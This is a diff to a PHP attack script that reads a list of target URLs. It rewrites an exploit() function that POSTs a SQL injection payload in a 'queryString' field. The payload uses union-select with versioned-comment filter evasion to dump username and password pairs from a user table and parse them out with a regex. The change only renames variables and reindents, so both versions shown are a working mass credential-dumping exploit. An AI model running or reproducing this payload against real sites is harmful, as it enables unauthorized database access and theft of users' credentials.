@@ -71,15 +71,15 @@ foreach($file as $url){
 }
 //function
 function exploit($url){
-$c = curl_init();
-$ploit = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";
-curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($c, CURLOPT_URL, $url);
-curl_setopt($c, CURLOPT_POSTFIELDS, "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$ploit,version()-- -");
-curl_setopt($c, CURLOPT_VERBOSE, false);
-$str = curl_exec($c);
-$preg = preg_match_all("'<result>(.*?)</result>'si", $str, $isi);
-return $isi;
+	$ch = curl_init();
+	$ploit = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$ploit,version()-- -");
+	curl_setopt($ch, CURLOPT_VERBOSE, false);
+	$response = curl_exec($ch);
+	$c = preg_match_all("'<result>(.*?)</result>'si", $response,$code);
+	return $code;
 }function banner($R,$G,$Y,$B,$X,$P,$C){
 //echo "$B
 // ---------------------------------------------
